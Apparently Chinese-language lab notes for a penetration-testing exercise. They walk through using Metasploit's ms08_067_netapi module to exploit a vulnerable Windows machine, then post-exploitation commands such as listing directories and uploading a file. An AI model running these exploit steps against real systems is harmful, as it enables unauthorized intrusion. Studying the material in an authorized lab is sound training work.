
#
```
完成此實驗吼,你可以學到下列技術:

(1)	如何得知區域網路上是否有機器是live的?
(2)	如何得知肉雞的作業系統版本.
(3)	如何檢測肉雞具備XXX的漏洞
     WINDOWS系統常見的漏洞: ms08-067 | ms17-010
(4)	如何打洞?   (pwn,exploitation)
(5)	入侵後能做什麼  (post-exploitation) 
```

#

```
預先處理:第一次執行msfconsole時先執行下列步驟
啟動metasploit所需的資料庫

service postgresql start
msfdb init
```
```
啟動攻擊神器====>輸入msfconsole
```
```
search ms08_067
```

```
使用ms08_067_netapi攻擊模組

use exploit/windows/smb/ms08_067_netapi
```


```
顯示需要設定參數的選項=====  show options
```


```
設定各種參數====
set  RHOST   < 弱機的IP>
```


```
下達發動攻擊的指令====exploit
```

### Post-exploitation

```
pwd
ls

mkdir XXX

upload /root/Desktop/carter.jpg
```
